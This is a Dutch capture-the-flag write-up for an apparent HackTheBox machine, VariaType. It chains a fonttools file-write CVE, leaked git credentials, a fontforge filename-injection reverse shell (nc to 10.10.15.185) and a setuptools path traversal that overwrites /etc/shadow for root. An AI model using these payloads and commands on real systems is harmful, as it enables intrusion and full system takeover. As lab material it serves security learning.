# VariaType

# Initiele scan

Dit lijkt een SaaS-achtige software rondom het genereren van variable fonts. In
de UI is het mogelijk om een `.designspace` bestand inclusief fonts (`.ttf` of
`.otf`) up te loaden.

Daarnaast is er ook een `portal.variatype.htb` pagina waarop een login is
opgenomen. Dit lijkt een _employee portal_ te zijn.

Verder staat in hun services ook dat ze CI integratie aanbieden met de volgende
tools, `fonttools`, `fontmake`, `gftools`. Dit is waarschijnlijk ook iets dat ze
op de achtergrond gebruiken voor het genereren van fonts en dus een goede om mee
te nemen in de research voor mogelijke CVE's

# CVE-2025-66034

In `fonttools` is een arbritraire file-write exploit mogelijk, zie ook [github
advisory](https://github.com/advisories/GHSA-768j-98cg-p3fv). Een goede eerste
kandidaat om uit te zoeken.

> _Testen met valide upload en fonts komen in een `/download` folder terecht met
> een willekeure ID waarde_

Het lijkt er op dat we hier wel een exploit te pakken hebben. Met het spelen en
aanpassen van de `filename` waarde in het `.designspace` bestand kunnen we
namelijk soms wel en soms niet een error triggeren. Bijvoorbeeld:

- `/tmp/out` Dit gaat goed
- `/tmp/non/existing/folder/out` Gaat ook goed
- `/etc/out` Dit niet

Alleen root mag normaal naar de `/etc` folder schrijven dus dit gaat
waarschijnlijk mis ivm een permissie probleem. Nu nog uitzoeken hoe dit uit te
buiten is.

## XXE uitstapje

We hebben wel te maken met XML, misschien dat een XXE een betere is om te testen
of het uit te buiten is. Als dat namelijk lukt dan hebben we waarschijnlijk een
stuk meer info dan een arbitraire file-write.

Aantal dingen geprobeerd en niet echt succes mee gehad, dit lijkt een dead end.

# portal.variatype

Ik ben dom, na vast gezeten te hebben ben ik teruggegaan naar de
`portal.variatype.htb` pagina en na fuzzing lijkt hier een git directory exposed
te zijn. Dit klinkt als een hele goede om eerst naar te kijken.

De git logs tonen een commit met als titel `Remove hardcoded credentials`, tijd
om terug te gaan naar de goede oude tijd met hardcoded credentials. Wanneer ik
nu in de code kijk kom ik het volgende tegen

```
gitbot:G1tB0t_Acc3ss_2025!
```

Hiermee hebben we toegang tot het portal.

## Exploit time

Op het portal draait php en kan ik de geuploade bestanden inzien. Dit gaat een
url `/view.php?f={name}`. Hier zijn dus twee dingen goed om uit te zoeken.

> _Er is ook een `/download.php?f={name}`, hier geldt natuurlijk hetzelfde voor_

- De eerdere CVE waarmee we arbritraire data in het bestand konden krijgen
- Een LFI exploit
- Het lijkt er op dat alle bestanden in de `/files` folder terecht komen

> Notes rondom uploaden

```
# Dit is de standaard folder
/var/www/html/

# Met wegschrijven mag ik schrijven in
../cmd.php
../../cmd.php

# Maar niet in
../../../cmd.php
```

### LELIJK

Om te kijken of ik paden kon achterhalen was ik aan het kijken naar waar CSS en
JS vandaan gedownload wordt. In de CSS staat als regel 1

```css
/* /var/www/dev.variatype.htb/styles.css */
```

Nu hebben we dus onze folder te pakken. Maar ik kan niet naar deze folder
schrijven?!

## RCE

Met de url van hierboven uiteindelijk weten te gokken dat er ook een
`/var/www/portal.variatype.htb/public` folder is waar we wel naartoe kunnen
schrijven. Dit in combi met de CVE die we eerder vonden betekend dat we nu PHP
code kunnen uploaden.

# Foothold

Met de CVE en een standaard php revshell van revshells heb ik een RCE te pakken.
Standaard user info van de machine:

```
# /etc/passwd
root:x:0:0:root:/root:/bin/bash
steve:x:1000:1000:steve,,,:/home/steve:/bin/bash
```

## Gekke files

Er waren wat gekke files in `/opt`, zoals een `script.py` en een
`process_client_submissions.sh`. Met
[pspy](https://github.com/DominicBreuker/pspy) zie ik dat
`process_client_submissions.sh` aangeroepen wordt. Waarschijnlijk vanuit een
cronjob. Volledige command is `/bin/bash
/home/steve/bin/process_client_submissions.sh`. Dit gaat dus om de `steve` user.

## Fontforge

Het script lezend roept dit een fontforge commando aan. Nu lijkt hier een CVE te
zijn met `CVE-2024-25081` waardoor command injectie mogelijk is door command
injection in de bestands naam te doen.

Uiteindelijk via het volgende script een zipfile aangemaakt met daarin de
injectie:

```bash
#!/bin/bash

PAYLOAD="nc -c /bin/bash 10.10.15.185 9002 &"
PAYLOAD_B64=$(echo $PAYLOAD | base64)

FILE="foo.ttf\$(echo \"$PAYLOAD_B64\" | base64 -d | bash)"
touch "$FILE"
zip exploit.zip "$FILE"
```

# Privesc

Als `steve` mag ik een python script aanroepen als sudo, achterhaald met `sudo
-l`. Hiermee lijk ik iets te kunnen downloaden en dit word weggeschreven in een
bepaalde folder. Waarschijnlijk, maar dit is een aanname, kan ik dit gebruiken
om `/etc/shadow` te overschrijven zodat ik een root wachtwoord heb om in te
loggen.

Hierbij kijk ik vooral naar dit issue die ik hierover gevonden heb: [github
issue](https://github.com/pypa/setuptools/issues/4946)

Als ik het zo de code en het issue lees is het probleem hier als volgt. De code
kijkt naar het stukje na de laatste `/` maar als je `/%2f` doet dan begint de
naam met een `/`. Waarmee je dan buiten de folder kan schrijven.

## Scriptje

Een simpel scriptje in go geschreven die een `/etc/shadow`-achtig bestand
teruggeeft:

```go
package main

import "net/http"

func main() {
        mux := http.NewServeMux()
        mux.HandleFunc("GET /", func(w http.ResponseWriter, req *http.Request) {
            // Password hash equals "pwn"
            w.Write([]byte("root:$y$j9T$nPmzO7xTSDlQ4fqITPaV4.$tL4SO6RdR2G5ZUGbtxzHZmALSf7iTbhqjAuJ3GPLSj2::0:99999:7:::\n"))
        })

        http.ListenAndServe(":9003", mux)
}
```

Vanaf de `steve` user kon ik nu het volgende aanroepen

```bash
# Overschrijf /etc/shadow
/usr/bin/python3 /opt/font-tools/install_validator.py 'http://10.10.15.185:9003/%2Fetc%2fshadow'

# Login als root met wachtwoord "pwn"
su
```

# Retrospective

Wat kan beter voor de volgende keer

- Beter fuzzen, ik heb het volgende gemist of lang over gedaan
  - De fuzz op `portal.variatype.htb` om de `.git` folder te vinden
  - Het vinden van de `public` folder, deze was uiteindelijk ook te vinden via
    de LFI in `download.php`
- LFI, hier had ik via de `/download` een LFI kunnen vinden
  - De code hier deed een `replace("../", "")`. Kortom aanroepen met `....//`
    en je kan wel data uitlezen
